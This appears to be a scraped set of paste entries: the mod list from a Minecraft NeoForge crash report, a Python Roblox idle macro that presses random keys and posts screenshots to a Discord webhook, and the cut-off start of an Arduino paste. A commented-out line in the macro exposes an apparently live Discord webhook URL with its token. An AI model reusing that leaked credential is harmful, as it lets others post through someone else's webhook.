		architectury-13.0.8-neoforge.jar                  |Architectury                  |architectury                  |13.0.8              |Manifest: NOSIGNATURE
		artifacts-neoforge-13.0.6.jar                     |Artifacts                     |artifacts                     |13.0.6              |Manifest: NOSIGNATURE
		athena-neoforge-1.21-4.0.1.jar                    |Athena                        |athena                        |4.0.1               |Manifest: NOSIGNATURE
		attributefix-neoforge-1.21.1-21.1.2.jar           |AttributeFix                  |attributefix                  |21.1.2              |Manifest: NOSIGNATURE
		BadOptimizations-2.2.2-1.21.1.jar                 |BadOptimizations              |badoptimizations              |2.2.2               |Manifest: NOSIGNATURE
		balm-neoforge-1.21.1-21.0.46.jar                  |Balm                          |balm                          |21.0.46             |Manifest: NOSIGNATURE
		BetterAdvancements-NeoForge-1.21.1-0.4.3.21.jar   |Better Advancements           |betteradvancements            |0.4.3.21            |Manifest: NOSIGNATURE
		bookshelf-neoforge-1.21.1-21.1.64.jar             |Bookshelf                     |bookshelf                     |21.1.64             |Manifest: NOSIGNATURE
		butcher-3.5.5-neoforge-1.21.1.jar                 |Butcher                       |butcher                       |3.5.5               |Manifest: NOSIGNATURE
		cherishedworlds-neoforge-10.1.1+1.21.1.jar        |Cherished Worlds              |cherishedworlds               |10.1.1+1.21.1       |Manifest: NOSIGNATURE
		chunksending-1.21-2.8.jar                         |chunksending mod              |chunksending                  |2.8                 |Manifest: NOSIGNATURE
		Clumps-neoforge-1.21.1-19.0.0.1.jar               |Clumps                        |clumps                        |19.0.0.1            |Manifest: NOSIGNATURE
		conditional-mixin-neoforge-0.6.4.jar              |conditional mixin             |conditional_mixin             |0.6.4               |Manifest: NOSIGNATURE
		connectivity-1.21.1-7.1.jar                       |Connectivity Mod              |connectivity                  |7.1                 |Manifest: NOSIGNATURE
		cookingforblockheads-neoforge-1.21.1-21.1.15.jar  |Cooking for Blockheads        |cookingforblockheads          |21.1.15             |Manifest: NOSIGNATURE
		corpse-neoforge-1.21.1-1.1.7.jar                  |Corpse                        |corpse                        |1.21.1-1.1.7        |Manifest: NOSIGNATURE
		create-1.21.1-6.0.6.jar                           |Create                        |create                        |6.0.6               |Manifest: NOSIGNATURE
		create_compressed-2.2.0-neoforge-1.21.1.jar       |Create Compressed             |create_compressed             |2.2.0               |Manifest: NOSIGNATURE
		create_mechanical_extruder-1.21.1-2.1.1-6.0.4.jar |Create Mechanical Extruder    |create_mechanical_extruder    |1.21.1-2.1.1-6.0.4  |Manifest: NOSIGNATURE
		create-dragons-plus-1.6.0.jar                     |Create: Dragons Plus          |create_dragons_plus           |1.6.0               |Manifest: NOSIGNATURE
		create-enchantment-industry-2.1.6.jar             |Create: Enchantment Industry  |create_enchantment_industry   |2.1.6               |Manifest: NOSIGNATURE
		create_structures_arise-159.32.31-neoforge-1.21.1.|Create: Structures Arise      |create_structures_arise       |159.32.31           |Manifest: NOSIGNATURE
		create_things_and_misc-4.0-neoforge-1.21.1.jar    |create: things and misc       |create_things_and_misc        |1.0.0               |Manifest: NOSIGNATURE
		create_ultimate_factory-2.1.0-neoforge-1.21.1.jar |Create: Ultimate Factory      |create_ultimate_factory       |2.1.0               |Manifest: NOSIGNATURE
		cupboard-1.21-2.9.jar                             |Cupboard mod                  |cupboard                      |2.9                 |Manifest: NOSIGNATURE
		curios-neoforge-9.5.1+1.21.1.jar                  |Curios API                    |curios                        |9.5.1+1.21.1        |Manifest: NOSIGNATURE
		densemekanism-1.21.1-1.2.jar                      |Dense Mekanism                |densemekanism                 |1.2                 |Manifest: NOSIGNATURE
		Design-n-Decor-1.21.1-2.0.2.jar                   |Design n' Decor               |dndecor                       |2.0.2               |Manifest: NOSIGNATURE
		distraction_free_recipes-neoforge-1.2.1-1.21.1.jar|Distraction Free Recipes (EMI)|distraction_free_recipes      |1.2.1               |Manifest: NOSIGNATURE
		dynamic-fps-3.9.4+minecraft-1.21.0-neoforge.jar   |Dynamic FPS                   |dynamic_fps                   |3.9.4               |Manifest: NOSIGNATURE
		embeddium-1.0.15+mc1.21.1.jar                     |Embeddium                     |embeddium                     |1.0.15+mc1.21.1     |Manifest: NOSIGNATURE
		emi-1.1.22+1.21.1+neoforge.jar                    |EMI                           |emi                           |1.1.22+1.21.1+neofor|Manifest: NOSIGNATURE
		emi_enchanting-0.1.2+1.21+neoforge.jar            |EMI Enchanting                |emi_enchanting                |0.1.2+1.21+neoforge |Manifest: NOSIGNATURE
		emi_loot-0.7.6+1.21+neoforge.jar                  |EMI Loot                      |emi_loot                      |0.7.6+1.21+neoforge |Manifest: NOSIGNATURE
		enchdesc-neoforge-1.21.1-21.1.7.jar               |EnchantmentDescriptions       |enchdesc                      |21.1.7              |Manifest: NOSIGNATURE
		endersdelight-neoforge-1.21.1-1.1.0.jar           |Ender's Delight               |endersdelight                 |1.1.0               |Manifest: NOSIGNATURE
		entityculling-neoforge-1.7.4-mc1.21.jar           |EntityCulling                 |entityculling                 |1.7.4               |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Actually Additions       |extra_mod_integrations_actuall|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Chipped                  |extra_mod_integrations_chipped|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Farmer's Delight         |extra_mod_integrations_farmers|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Iron's Spells 'n Spellboo|extra_mod_integrations_irons_s|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI PneumaticCraft           |extra_mod_integrations_pneumat|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Rechiseled               |extra_mod_integrations_rechise|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|ExMI Reliquary                |extra_mod_integrations_reliqua|1.0.2+1.21.1        |Manifest: NOSIGNATURE
		expandability-neoforge-12.0.0.jar                 |ExpandAbility                 |expandability                 |12.0.0              |Manifest: NOSIGNATURE
		extra-mod-integrations-all-neoforge-1.0.2+1.21.1.j|Extra Mod Integrations        |extra_mod_integrations        |1.0.2+1.21.1        |Manifest: NOSIGNATURE
		com.kneelawk.extra-mod-integrations.extra-mod-inte|Extra Mod Integrations Core   |extra_mod_integrations_core   |1.0.2+1.21.1        |Manifest: NOSIGNATURE
		FarmersDelight-1.21.1-1.2.8.jar                   |Farmer's Delight              |farmersdelight                |1.2.8               |Manifest: NOSIGNATURE
		FastSuite-1.21.1-6.0.4.jar                        |Fast Suite                    |fastsuite                     |6.0.4               |Manifest: NOSIGNATURE
		fastasyncworldsave-1.21-2.4.jar                   |fastasyncworldsave mod        |fastasyncworldsave            |2.4                 |Manifest: NOSIGNATURE
		fastleafdecay-35.jar                              |FastLeafDecay                 |fastleafdecay                 |35                  |Manifest: NOSIGNATURE
		ferritecore-7.0.2-neoforge.jar                    |Ferrite Core                  |ferritecore                   |7.0.2               |Manifest: 41:ce:50:66:d1:a0:05:ce:a1:0e:02:85:9b:46:64:e0:bf:2e:cf:60:30:9a:fe:0c:27:e0:63:66:9a:84:ce:8a
		flywheel-neoforge-1.21.1-1.0.4.jar                |Flywheel                      |flywheel                      |1.0.4               |Manifest: NOSIGNATURE
		forgified-fabric-api-0.115.6+2.1.0+1.21.1.jar     |Forgified Fabric API          |fabric_api                    |0.115.6+2.1.0+1.21.1|Manifest: NOSIGNATURE
		fabric-api-base-0.4.42+d1308dedd1.jar             |Forgified Fabric API Base     |fabric_api_base               |0.4.42+d1308dedd1   |Manifest: NOSIGNATURE
		fabric-api-lookup-api-v1-1.6.70+c21168c319.jar    |Forgified Fabric API Lookup AP|fabric_api_lookup_api_v1      |1.6.70+c21168c319   |Manifest: NOSIGNATURE
		fabric-biome-api-v1-13.0.31+1e62d33c19.jar        |Forgified Fabric Biome API (v1|fabric_biome_api_v1           |13.0.31+1e62d33c19  |Manifest: NOSIGNATURE
		fabric-block-api-v1-1.0.22+a6e994cd19.jar         |Forgified Fabric Block API (v1|fabric_block_api_v1           |1.0.22+a6e994cd19   |Manifest: NOSIGNATURE
		fabric-blockrenderlayer-v1-1.1.52+b089b4bd19.jar  |Forgified Fabric BlockRenderLa|fabric_blockrenderlayer_v1    |1.1.52+b089b4bd19   |Manifest: NOSIGNATURE
		fabric-block-view-api-v2-1.0.11+e9036fd419.jar    |Forgified Fabric BlockView API|fabric_block_view_api_v2      |1.0.11+e9036fd419   |Manifest: NOSIGNATURE
		fabric-client-tags-api-v1-1.1.15+e053909619.jar   |Forgified Fabric Client Tags  |fabric_client_tags_api_v1     |1.1.15+e053909619   |Manifest: NOSIGNATURE
		fabric-command-api-v2-2.2.28+36d727be19.jar       |Forgified Fabric Command API (|fabric_command_api_v2         |2.2.28+36d727be19   |Manifest: NOSIGNATURE
		fabric-content-registries-v0-8.0.18+0a0c14ff19.jar|Forgified Fabric Content Regis|fabric_content_registries_v0  |8.0.18+0a0c14ff19   |Manifest: NOSIGNATURE
		fabric-convention-tags-v1-2.1.4+7f945d5b19.jar    |Forgified Fabric Convention Ta|fabric_convention_tags_v1     |2.1.4+7f945d5b19    |Manifest: NOSIGNATURE
		fabric-convention-tags-v2-2.11.0+87e5848019.jar   |Forgified Fabric Convention Ta|fabric_convention_tags_v2     |2.11.0+87e5848019   |Manifest: NOSIGNATURE
		fabric-data-attachment-api-v1-1.4.3+58235da019.jar|Forgified Fabric Data Attachme|fabric_data_attachment_api_v1 |1.4.3+58235da019    |Manifest: NOSIGNATURE
		fabric-data-generation-api-v1-20.2.28+2d91a6db19.j|Forgified Fabric Data Generati|fabric_data_generation_api_v1 |20.2.28+2d91a6db19  |Manifest: NOSIGNATURE
		fabric-entity-events-v1-1.7.0+1af6e62419.jar      |Forgified Fabric Entity Events|fabric_entity_events_v1       |1.7.0+1af6e62419    |Manifest: NOSIGNATURE
		fabric-events-interaction-v0-0.7.13+7b71cc1619.jar|Forgified Fabric Events Intera|fabric_events_interaction_v0  |0.7.13+7b71cc1619   |Manifest: NOSIGNATURE
		fabric-game-rule-api-v1-1.0.53+36d727be19.jar     |Forgified Fabric Game Rule API|fabric_game_rule_api_v1       |1.0.53+36d727be19   |Manifest: NOSIGNATURE
		fabric-gametest-api-v1-2.0.5+29f188ce19.jar       |Forgified Fabric Game Test API|fabric_gametest_api_v1        |2.0.5+29f188ce19    |Manifest: NOSIGNATURE
		fabric-item-api-v1-11.1.1+57cdfa8219.jar          |Forgified Fabric Item API (v1)|fabric_item_api_v1            |11.1.1+57cdfa8219   |Manifest: NOSIGNATURE
		fabric-item-group-api-v1-4.1.7+e324903319.jar     |Forgified Fabric Item Group AP|fabric_item_group_api_v1      |4.1.7+e324903319    |Manifest: NOSIGNATURE
		fabric-key-binding-api-v1-1.0.47+62cc7ce119.jar   |Forgified Fabric Key Binding A|fabric_key_binding_api_v1     |1.0.47+62cc7ce119   |Manifest: NOSIGNATURE
		fabric-lifecycle-events-v1-2.5.0+a2ee258a19.jar   |Forgified Fabric Lifecycle Eve|fabric_lifecycle_events_v1    |2.5.0+a2ee258a19    |Manifest: NOSIGNATURE
		fabric-loot-api-v2-3.0.15+a3ee712d19.jar          |Forgified Fabric Loot API (v2)|fabric_loot_api_v2            |3.0.15+a3ee712d19   |Manifest: NOSIGNATURE
		fabric-loot-api-v3-1.0.3+333dfad919.jar           |Forgified Fabric Loot API (v3)|fabric_loot_api_v3            |1.0.3+333dfad919    |Manifest: NOSIGNATURE
		fabric-message-api-v1-6.0.13+e053909619.jar       |Forgified Fabric Message API (|fabric_message_api_v1         |6.0.13+e053909619   |Manifest: NOSIGNATURE
		fabric-model-loading-api-v1-2.0.0+986ae77219.jar  |Forgified Fabric Model Loading|fabric_model_loading_api_v1   |2.0.0+986ae77219    |Manifest: NOSIGNATURE
		fabric-networking-api-v1-4.3.0+4f690eb619.jar     |Forgified Fabric Networking AP|fabric_networking_api_v1      |4.3.0+4f690eb619    |Manifest: NOSIGNATURE
		fabric-object-builder-api-v1-15.2.1+cc242efd19.jar|Forgified Fabric Object Builde|fabric_object_builder_api_v1  |15.2.1+cc242efd19   |Manifest: NOSIGNATURE
		fabric-particles-v1-4.0.2+824f924c19.jar          |Forgified Fabric Particles (v1|fabric_particles_v1           |4.0.2+824f924c19    |Manifest: NOSIGNATURE
		fabric-recipe-api-v1-5.0.14+59440bcc19.jar        |Forgified Fabric Recipe API (v|fabric_recipe_api_v1          |5.0.14+59440bcc19   |Manifest: NOSIGNATURE
		fabric-registry-sync-v0-5.2.0+867470b919.jar      |Forgified Fabric Registry Sync|fabric_registry_sync_v0       |5.2.0+867470b919    |Manifest: NOSIGNATURE
		fabric-renderer-indigo-1.7.0+4198af7119.jar       |Forgified Fabric Renderer - In|fabric_renderer_indigo        |1.7.0+4198af7119    |Manifest: NOSIGNATURE
		fabric-renderer-api-v1-3.4.0+9c40919e19.jar       |Forgified Fabric Renderer API |fabric_renderer_api_v1        |3.4.0+9c40919e19    |Manifest: NOSIGNATURE
		fabric-rendering-v1-5.0.5+077ba95f19.jar          |Forgified Fabric Rendering (v1|fabric_rendering_v1           |5.0.5+077ba95f19    |Manifest: NOSIGNATURE
		fabric-rendering-data-attachment-v1-0.3.49+73761d2|Forgified Fabric Rendering Dat|fabric_rendering_data_attachme|0.3.49+73761d2e19   |Manifest: NOSIGNATURE
		fabric-rendering-fluids-v1-3.1.6+857185bc19.jar   |Forgified Fabric Rendering Flu|fabric_rendering_fluids_v1    |3.1.6+857185bc19    |Manifest: NOSIGNATURE
		fabric-resource-conditions-api-v1-4.3.0+5bdd099819|Forgified Fabric Resource Cond|fabric_resource_conditions_api|4.3.0+5bdd099819    |Manifest: NOSIGNATURE
		fabric-resource-loader-v0-1.3.1+4ea8954419.jar    |Forgified Fabric Resource Load|fabric_resource_loader_v0     |1.3.1+4ea8954419    |Manifest: NOSIGNATURE
		fabric-screen-api-v1-2.0.25+4228281319.jar        |Forgified Fabric Screen API (v|fabric_screen_api_v1          |2.0.25+4228281319   |Manifest: NOSIGNATURE
		fabric-screen-handler-api-v1-1.3.88+8dbc56dd19.jar|Forgified Fabric Screen Handle|fabric_screen_handler_api_v1  |1.3.88+8dbc56dd19   |Manifest: NOSIGNATURE
		fabric-sound-api-v1-1.0.23+10b84f8419.jar         |Forgified Fabric Sound API (v1|fabric_sound_api_v1           |1.0.23+10b84f8419   |Manifest: NOSIGNATURE
		fabric-transfer-api-v1-5.4.2+a25cb45619.jar       |Forgified Fabric Transfer API |fabric_transfer_api_v1        |5.4.2+a25cb45619    |Manifest: NOSIGNATURE
		fabric-transitive-access-wideners-v1-6.2.0+6c854b6|Forgified Fabric Transitive Ac|fabric_transitive_access_widen|6.2.0+6c854b6f19    |Manifest: NOSIGNATURE
		framework-neoforge-1.21.1-0.9.6.jar               |Framework                     |framework                     |0.9.6               |Manifest: NOSIGNATURE
		fzzy_config-0.7.0+1.21+neoforge.jar               |Fzzy Config                   |fzzy_config                   |0.7.0+1.21+neoforge |Manifest: NOSIGNATURE
		geckolib-neoforge-1.21.1-4.7.5.1.jar              |GeckoLib 4                    |geckolib                      |4.7.5.1             |Manifest: NOSIGNATURE
		gpumemleakfix-1.21-1.8.jar                        |Gpu memory leak fix           |gpumemleakfix                 |1.8                 |Manifest: NOSIGNATURE
		GrandPower-3.0.2.jar                              |Grand Power                   |grandpower                    |3.0.2               |Manifest: NOSIGNATURE
		guardvillagers-2.3.2-1.21.1.jar                   |Guard Villagers               |guardvillagers                |2.3.2               |Manifest: NOSIGNATURE
		guideme-21.1.9.jar                                |GuideME                       |guideme                       |21.1.9              |Manifest: NOSIGNATURE
		handcrafted-neoforge-1.21.1-4.0.3.jar             |Handcrafted                   |handcrafted                   |4.0.3               |Manifest: NOSIGNATURE
		Highlighter-1.21-neoforge-1.1.11.jar              |Highlighter                   |highlighter                   |1.1.11              |Manifest: NOSIGNATURE
		HostileNeuralNetworks-1.21.1-6.2.0.jar            |Hostile Neural Networks       |hostilenetworks               |6.2.0               |Manifest: NOSIGNATURE
		Iceberg-1.21.1-neoforge-1.3.2.jar                 |Iceberg                       |iceberg                       |1.3.2               |Manifest: NOSIGNATURE
		ImmersiveEngineering-1.21.1-12.3.1-189.jar        |Immersive Engineering         |immersiveengineering          |12.3.1-189          |Manifest: NOSIGNATURE
		Jade-1.21.1-NeoForge-15.10.0.jar                  |Jade                          |jade                          |15.10.0+neoforge    |Manifest: NOSIGNATURE
		jei-1.21.1-neoforge-19.21.2.313.jar               |Just Enough Items             |jei                           |19.21.2.313         |Manifest: NOSIGNATURE
		JustEnoughMekanismMultiblocks-1.21.1-7.7.jar      |Just Enough Mekanism Multibloc|jei_mekanism_multiblocks      |7.7                 |Manifest: NOSIGNATURE
		JustEnoughResources-NeoForge-1.21.1-1.6.0.17.jar  |Just Enough Resources         |jeresources                   |1.6.0.17            |Manifest: NOSIGNATURE
		thedarkcolour.kffmod-5.8.0.jar                    |Kotlin For Forge              |kotlinforforge                |5.8.0               |Manifest: NOSIGNATURE
		kuma-api-neoforge-21.0.5+1.21.jar                 |KumaAPI                       |kuma_api                      |21.0.5              |Manifest: NOSIGNATURE
		L_Ender's Cataclysm-2.66-1.21.1.jar               |L_Ender's Cataclysm           |cataclysm                     |2.66-1.21.1         |Manifest: NOSIGNATURE
		letmedespawn-1.21.x-neoforge-1.5.0.jar            |Let Me Despawn                |letmedespawn                  |1.5.0               |Manifest: NOSIGNATURE
		lionfishapi-2.6.jar                               |lionfishapi                   |lionfishapi                   |2.6                 |Manifest: NOSIGNATURE
		lootintegrations-1.21.1-4.7.jar                   |Lootintegrations mod          |lootintegrations              |4.7                 |Manifest: NOSIGNATURE
		lootr-neoforge-1.21-1.10.35.91.jar                |Lootr                         |lootr                         |1.21-1.10.35.91     |Manifest: NOSIGNATURE
		mechanicals-1.21.1-1.0.9.jar                      |Mechanicals Lib               |mechanicals                   |1.0.8               |Manifest: NOSIGNATURE
		Mekanism-1.21.1-10.7.14.79.jar                    |Mekanism                      |mekanism                      |10.7.14             |Manifest: NOSIGNATURE
		fissionrecipe-3.0.7-1.21.1.jar                    |Mekanism Fission Recipe       |fissionrecipe                 |3.0.7               |Manifest: NOSIGNATURE
		mekanism_weaponry-2.0.4.jar                       |Mekanism Weaponry             |mekanism_weaponry             |2.0.4               |Manifest: NOSIGNATURE
		MekanismAdditions-1.21.1-10.7.14.79.jar           |Mekanism: Additions           |mekanismadditions             |10.7.14             |Manifest: NOSIGNATURE
		MekanismGenerators-1.21.1-10.7.14.79.jar          |Mekanism: Generators          |mekanismgenerators            |10.7.14             |Manifest: NOSIGNATURE
		MekanismSciece-1.21.1-1.4.jar                     |Mekanism: Science             |mekanismscience               |1.4                 |Manifest: NOSIGNATURE
		MekanismTools-1.21.1-10.7.14.79.jar               |Mekanism: Tools               |mekanismtools                 |10.7.14             |Manifest: NOSIGNATURE
		mekmm-1.21.1-1.0.2.jar                            |MekanismMoreMachine           |mekmm                         |1.21.1-1.0.2        |Manifest: NOSIGNATURE
		client-1.21.1-20240808.144430-srg.jar             |Minecraft                     |minecraft                     |1.21.1              |Manifest: a1:d4:5e:04:4f:d3:d6:e0:7b:37:97:cf:77:b0:de:ad:4a:47:ce:8c:96:49:5f:0a:cf:8c:ae:b2:6d:4b:8a:3f
		mininggadgets-1.18.6.jar                          |Mining Gadgets                |mininggadgets                 |1.18.6              |Manifest: NOSIGNATURE
		modelfix-1.21-1.10.jar                            |Model Gap Fix                 |modelfix                      |1.21-1.10           |Manifest: NOSIGNATURE
		modernfix-neoforge-5.23.1+mc1.21.1.jar            |ModernFix                     |modernfix                     |5.23.1+mc1.21.1     |Manifest: NOSIGNATURE
		molten_vents-1.21.1-2.1.0.jar                     |Molten Vents                  |molten_vents                  |2.1.0               |Manifest: NOSIGNATURE
		moonlight-1.21-2.18.18-neoforge.jar               |Moonlight Lib                 |moonlight                     |1.21-2.18.18        |Manifest: NOSIGNATURE
		MoreMekanismProcessing-1.21.1-6.5.jar             |More Mekanism Processing      |moremekanismprocessing        |6.5                 |Manifest: NOSIGNATURE
		MouseTweaks-neoforge-mc1.21-2.26.1.jar            |Mouse Tweaks                  |mousetweaks                   |2.26.1              |Manifest: NOSIGNATURE
		refurbished_furniture-neoforge-1.21.1-1.0.16.jar  |MrCrayfish's Furniture Mod: Re|refurbished_furniture         |1.0.16              |Manifest: NOSIGNATURE
		MyNethersDelight-1.21.1-1.8.jar                   |My Nether's Delight           |mynethersdelight              |1.8                 |Manifest: NOSIGNATURE
		neoforge-21.1.179-universal.jar                   |NeoForge                      |neoforge                      |21.1.179            |Manifest: NOSIGNATURE
		noisium-neoforge-2.3.0+mc1.21-1.21.1.jar          |Noisium                       |noisium                       |2.3.0+mc1.21-1.21.1 |Manifest: NOSIGNATURE
		oracle_index-neoforge-0.3.0.jar                   |Oracle Index                  |oracle_index                  |0.3.0               |Manifest: NOSIGNATURE
		oritech-neoforge-0.16.1.jar                       |Oritech                       |oritech                       |0.16.1              |Manifest: NOSIGNATURE
		owo-lib-neoforge-0.12.15.1-beta.3+1.21.jar        |oωo                           |owo                           |0.12.15.1-beta.3+1.2|Manifest: NOSIGNATURE
		packetfixer-neoforge-2.1.0-1.21-to-1.21.3.jar     |Packet Fixer                  |packetfixer                   |2.1.0               |Manifest: NOSIGNATURE
		Patchouli-1.21-88-NEOFORGE.jar                    |Patchouli                     |patchouli                     |1.21-88-NEOFORGE    |Manifest: NOSIGNATURE
		Placebo-1.21.1-9.8.1.jar                          |Placebo                       |placebo                       |9.8.1               |Manifest: NOSIGNATURE
		pneumaticcraft-repressurized-8.2.12+mc1.21.1.jar  |PneumaticCraft: Repressurized |pneumaticcraft                |8.2.12              |Manifest: NOSIGNATURE
		polymorph-neoforge-1.0.10+1.21.1.jar              |Polymorph                     |polymorph                     |1.0.10+1.21.1       |Manifest: NOSIGNATURE
		Ponder-NeoForge-1.21.1-1.0.56.0.jar               |Ponder                        |ponder                        |1.0.56.0            |Manifest: NOSIGNATURE
		prickle-neoforge-1.21.1-21.1.8.jar                |PrickleMC                     |prickle                       |21.1.8              |Manifest: NOSIGNATURE
		resourcefullib-neoforge-1.21-3.0.12.jar           |Resourceful Lib               |resourcefullib                |3.0.12              |Manifest: NOSIGNATURE
		shulkerboxtooltip-neoforge-5.1.6+1.21.1.jar       |ShulkerBoxTooltip             |shulkerboxtooltip             |5.1.6+1.21.1        |Manifest: NOSIGNATURE
		smoothchunk-1.21-4.1.jar                          |Smoothchunk mod               |smoothchunk                   |4.1                 |Manifest: NOSIGNATURE
		sophisticatedbackpacks-1.21.1-3.24.15.1250.jar    |Sophisticated Backpacks       |sophisticatedbackpacks        |3.24.15             |Manifest: NOSIGNATURE
		sophisticatedcore-1.21.1-1.3.50.1004.jar          |Sophisticated Core            |sophisticatedcore             |1.3.50              |Manifest: NOSIGNATURE
		structureessentials-1.21.1-4.7.jar                |Structure Essentials mod      |structureessentials           |4.7                 |Manifest: NOSIGNATURE
		superbwarfare-1.21.1-0.8.2-70948bb2.jar           |Superb Warfare                |superbwarfare                 |0.8.2               |Manifest: NOSIGNATURE
		supplementaries-1.21-3.1.8-neoforge.jar           |Supplementaries               |supplementaries               |1.21-3.1.8          |Manifest: NOSIGNATURE
		txnilib-neoforge-1.0.24-1.21.1.jar                |TxniLib                       |txnilib                       |1.0.24              |Manifest: NOSIGNATURE
		Xaeros_Minimap_25.2.6_NeoForge_1.21.jar           |Xaero's Minimap               |xaerominimap                  |25.2.6              |Manifest: NOSIGNATURE
		XaerosWorldMap_1.39.9_NeoForge_1.21.jar           |Xaero's World Map             |xaeroworldmap                 |1.39.9              |Manifest: NOSIGNATURE
		YungsApi-1.21.1-NeoForge-5.1.5.jar                |YUNG's API                    |yungsapi                      |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
		YungsBetterDungeons-1.21.1-NeoForge-5.1.4.jar     |YUNG's Better Dungeons        |betterdungeons                |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
		YungsBetterEndIsland-1.21.1-NeoForge-3.1.2.jar    |YUNG's Better End Island      |betterendisland               |1.21.1-NeoForge-3.1.|Manifest: NOSIGNATURE
		YungsBetterMineshafts-1.21.1-NeoForge-5.1.1.jar   |YUNG's Better Mineshafts      |bettermineshafts              |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
		YungsBetterNetherFortresses-1.21.1-NeoForge-3.1.5.|YUNG's Better Nether Fortresse|betterfortresses              |1.21.1-NeoForge-3.1.|Manifest: NOSIGNATURE
		YungsBetterOceanMonuments-1.21.1-NeoForge-4.1.2.ja|YUNG's Better Ocean Monuments |betteroceanmonuments          |1.21.1-NeoForge-4.1.|Manifest: NOSIGNATURE
		YungsBetterStrongholds-1.21.1-NeoForge-5.1.3.jar  |YUNG's Better Strongholds     |betterstrongholds             |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
		YungsBetterWitchHuts-1.21.1-NeoForge-4.1.1.jar    |YUNG's Better Witch Huts      |betterwitchhuts               |1.21.1-NeoForge-4.1.|Manifest: NOSIGNATURE
		YungsBridges-1.21.1-NeoForge-5.1.1.jar            |YUNG's Bridges                |yungsbridges                  |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
		YungsExtras-1.21.1-NeoForge-5.1.1.jar             |YUNG's Extras                 |yungsextras                   |1.21.1-NeoForge-5.1.|Manifest: NOSIGNATURE
	Crash Report UUID: ccd6333f-3879-435c-9dbd-e538d549f80a
	FML: 4.0.39
	NeoForge: 21.1.179
	Flywheel Backend: flywheel:off"
seCvTvF1,Untitled,Frograbbit3,Python,Saturday 14th of June 2025 06:09:28 PM CDT,"import pyautogui
import requests
import time
import json
from datetime import datetime, timezone
import subprocess
import random
import sys
import os
if sys.platform == ""win32"":
    import pydirectinput
elif sys.platform.startswith(""linux""):
    # nothing else needed for xdotool
    pass
else:
    raise NotImplementedError(""Unsupported OS"")

 #""https://discord.com/api/webhooks/1381078711477997738/Ahf6Gk0_wSkXjhIwKTHkdQOO0m__UqgMFVv1imzGKvNhVhZWtP_cX1-GVRcKMQ8MyB3X""#
WEBHOOK=""""
if os.path.exists(""webhook.txt""):
    WEBHOOK=open(""webhook.txt"", ""r"").read()
else:
    WEBHOOK=input(""[i] Please provide a webhook url>"")
    with open(""webhook.txt"", ""w"") as f:
        f.write(WEBHOOK)
print(f""[i] Detected webhook {WEBHOOK}"")
print(f""[i] Waiting 10 seconds for Roblox to open..."")
time.sleep(10)

def takePhoto(name=""crop.png""):
    w, h = pyautogui.size()
    img = pyautogui.screenshot().crop((
        int(w * (1882 / 2560)),
        int(h * (50 / 1440)),
        w,
        int(h * (300 / 1440))
    ))
    img.save(name)
    return name


file_path = takePhoto()
with open(file_path, ""rb"") as f:
    r = requests.post(WEBHOOK, files={""file"": (""crop.png"", f)}, data={""content"": ""Loading...""})
    msg_id = r.json()[""id""]

EDIT_URL = WEBHOOK.split(""?"")[0] + f""/messages/{msg_id}""
start = time.time()
last_update = start

def press_keys(keys, hold_duration=1):
    if sys.platform == ""win32"":
        # On Windows, use pydirectinput
        for k in keys:
            pydirectinput.keyDown(k)
            print(""[i] Key down:"", k)
        time.sleep(hold_duration)
        for k in keys:
            pydirectinput.keyUp(k)
            print(""[i] Key up:"", k)

    elif sys.platform.startswith(""linux""):
        # On Linux, use xdotool
        for k in keys:
            subprocess.run([""xdotool"", ""keydown"", k])
            print(""[i] Key down:"", k)
        time.sleep(hold_duration)
        for k in keys:
            subprocess.run([""xdotool"", ""keyup"", k])
            print(""[i] Key up:"", k)

keyChoices = [[""w"", ""a""], [""w"", ""d""], [""s""], [""Left""], [""Right""], [""space""], [""space"", ""w""], [""space"", ""s""], [""space"", ""a""], [""space"", ""d""]]
print(""[i] Macro has been started successfully"")

def update():
        file_path = takePhoto()
        with open(file_path, ""rb"") as f:
            files = {""files[0]"": (""crop.png"", f, ""image/png"")}
            embed = {
                ""title"": ""Macro Update"",
                ""color"": 0x7289DA,
                ""fields"": [
                    {
                        ""name"": ""🕒 Uptime"",
                        ""value"": f""<t:{round(start)}:R>"",
                        ""inline"": True
                    },
                    {
                        ""name"": ""⌨️  Keys Pressed"",
                        ""value"": f""`{' + '.join(ch)}`"",
                        ""inline"": True
                    },
                    {
                        ""name"": ""⏳ Holding Duration"",
                        ""value"": f""{d1} seconds"",
                        ""inline"": True
                    },
                    {
                        ""name"": ""🔁 Time Since Last Update"",
                        ""value"": f""<t:{round(last_update)}:R>"",
                        ""inline"": True
                    }
                ],
                ""image"": {
                    ""url"": ""attachment://crop.png""
                },
                ""footer"": {
                    ""text"": f""Next update in {d1} seconds...""
                },
                ""timestamp"": datetime.now(timezone.utc).isoformat()
            }

            payload = {
                ""embeds"": [embed],
                ""attachments"": [
                    {
                        ""id"": 0,
                        ""filename"": ""crop.png"",
                        ""description"": f""Keys pressed: {' + '.join(ch)}""
                    }
                ]
            }

            res = requests.patch(
                EDIT_URL,
                files=files,
                data={""payload_json"": json.dumps(payload)}
            )


            if not res.ok:
                print(""❌ Failed to update message:"", res.status_code, res.text)
while True:
    try:
        now = time.time()
        ch = [""w""] if random.random() > 0.5 else random.choice(keyChoices)
        d1 = random.randint(1, 5)

        print(f""[i] Selected: {str(ch)} for {d1} seconds"")
        press_keys(ch, d1)
        update()

        last_update = now

    except Exception as e:
        print(""[e] "", e)
"
6Bv7U860,"""Serial Display"" rev_01",pleasedontcode,Arduino,Saturday 14th of June 2025 05:48:01 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

